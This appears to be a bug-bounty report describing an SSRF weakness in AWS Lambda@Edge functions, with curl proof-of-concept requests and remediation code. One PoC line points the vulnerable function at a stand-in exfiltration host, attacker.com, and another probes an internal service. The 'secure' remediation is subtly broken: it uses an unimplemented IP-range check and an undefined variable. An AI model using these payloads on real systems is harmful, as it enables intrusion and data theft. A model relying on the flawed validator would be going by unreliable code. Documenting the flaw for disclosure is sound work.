# Server-Side Request Forgery (SSRF) Bug Report - AWS Lambda@Edge

**Platform:** HackerOne
**Program:** Amazon (AWS)
**Severity:** MEDIUM (CVSS 6.5)
**Report Date:** 2026-06-07

---

## Summary

A Server-Side Request Forgery (SSRF) vulnerability was discovered in an AWS Lambda@Edge function that accepts user-controlled URL input. An attacker can exploit this to make the function fetch arbitrary URLs, potentially accessing internal services or exfiltrating data.

**Note:** Unlike standard Lambda functions, Lambda@Edge does NOT have access to EC2 Instance Metadata Service (IMDS) at 169.254.169.254. Therefore, direct AWS credential theft via IMDS is not possible.

---

## Description

AWS Lambda@Edge functions run at CloudFront edge locations worldwide. If a Lambda@Edge function accepts user-controlled input (query parameters, headers, URI) and passes it to `fetch()` or any HTTP client without proper validation, it becomes vulnerable to SSRF.

**What Lambda@Edge CAN do (attack surface):**
1. **Cross-domain SSRF** - Fetch arbitrary external URLs specified by attacker
2. **Internal API access** - Access internal microservices if reachable
3. **Data exfiltration** - Extract data from internal services to external attacker-controlled server
4. **Port scanning** - Probe internal network for open ports

**What Lambda@Edge CANNOT do:**
- Access EC2 metadata at 169.254.169.254 (no underlying EC2 instance)
- Directly steal IAM credentials from instance metadata

---

## Steps to Reproduce

1. Identify a CloudFront distribution with Lambda@Edge function
2. Find parameters accepted by the function (query string, headers, URI)
3. Inject a test URL (like Burp Collaborator) to confirm SSRF
4. If confirmed, escalate to internal service access or data exfiltration

---

## PoC (Proof of Concept)

### Setting Up Test Environment

**Important:** Lambda@Edge functions are customer-deployed. To test this vulnerability, you must:
1. Create your own CloudFront distribution with Lambda@Edge function
2. Deploy a vulnerable Lambda@Edge function (intentionally or via testing)
3. Test SSRF detection using your own infrastructure

### PoC 1: Blind SSRF Detection via Collaborator

```bash
# Deploy CloudFront + Lambda@Edge with vulnerable code
# Then test by injecting collaborator URL
curl "https://YOUR-DISTRIBUTION.cloudfront.net/?url=http://YOUR-COLLABORATOR.burpcollaborator.net/test"

# If you receive a hit at your collaborator server, SSRF is confirmed!
```

### PoC 2: Data Exfiltration via SSRF

```bash
# After confirming SSRF, test data exfiltration
curl "https://YOUR-DISTRIBUTION.cloudfront.net/?url=http://attacker.com/exfil?data=test"

# If internal APIs are reachable, try:
curl "https://YOUR-DISTRIBUTION.cloudfront.net/?url=http://internal-service.local:8080/api/data"
```

---

## Impact

**MEDIUM Severity - Data Access/Exfiltration:**

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Internal Data Access** | Access internal APIs not exposed to internet | High |
| **Data Exfiltration** | Extract sensitive data from internal services | High |
| **SSRF to Internal Networks** | Port scanning and service enumeration | Medium |
| **Open Redirect Chain** | Chain with redirect vulnerabilities | Medium |

**Real-World Attack Scenario:**
```
1. Attacker identifies CloudFront distribution with Lambda@Edge
2. Function accepts ?url= parameter passed to fetch()
3. Attacker injects: ?url=http://internal.company.internal/api/customers
4. Function fetches internal API and returns data in response
5. Attacker exfiltrates customer data to external server
6. Impact: Data breach of internal API data
```

**CVSS 3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` (6.5 Medium)

**Bounty Range:** $500-$2,000 depending on data sensitivity accessed

---

## Remediation

### 1. Validate and Sanitize All URL Input

```javascript
// SECURE: Strict URL validation
exports.handler = async (event) => {
  const request = event.Records[0].cf.request;
  const userUrl = request.uri.queryStringParameters?.url;
  
  if (!userUrl) return { status: 400 };
  
  // Validate URL format
  let parsed;
  try {
    parsed = new URL(userUrl);
  } catch {
    return { status: 400, body: "Invalid URL format" };
  }
  
  // Block dangerous protocols
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    return { status: 400, body: "Only HTTP/HTTPS allowed" };
  }
  
  // Use allowlist for allowed domains
  const allowedDomains = ['api.trusted.com', 'cdn.example.com'];
  if (!allowedDomains.includes(parsed.hostname)) {
    return { status: 403, body: "Domain not allowed" };
  }
  
  return fetch(userUrl);
};
```

### 2. Block Private IP Ranges

```javascript
const BLOCKED_RANGES = [
  '127.0.0.0/8',       // Localhost
  '10.0.0.0/8',        // Private Class A
  '172.16.0.0/12',     // Private Class B
  '192.168.0.0/16',    // Private Class C
  '169.254.0.0/16',    // AWS Metadata
  '0.0.0.0/8'          // Current network
];

function isBlockedIp(url) {
  try {
    const hostname = new URL(url).hostname;
    const ip = require('net').isIP(hostname);
    if (ip) {
      // Check if IP is in blocked range
      for (const range of BLOCKED_RANGES) {
        // Implement range checking
      }
    }
    return BLOCKED_IPS.includes(hostname);
  } catch {
    return true;
  }
}
```

### 3. Use Pre-Approved Fetch Destinations

```javascript
// Only fetch from known safe destinations
const ALLOWED_ENDPOINTS = [
  'https://api.company.com',
  'https://cdn.company.com'
];

// Validate against allowlist before fetch
```

---

## References

- [AWS Lambda@Edge Documentation](https://docs.aws.amazon.com/lambda/latest/dg/lambda-edge.html)
- [Lambda@Edge Restrictions](https://docs.aws.amazon.com/lambda/latest/dg/lambda-edge.html#edge-constraints)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## Timeline

- **Date Discovered:** 2026-06-07
- **Date Reported:** [Date]
- **Date Acknowledged:** [Pending]
- **Date Fixed:** [Pending]

---

**Reporter:** SARAhack
**Platform:** HackerOne
**Program:** Amazon (AWS)
**Last Updated:** 2026-06-07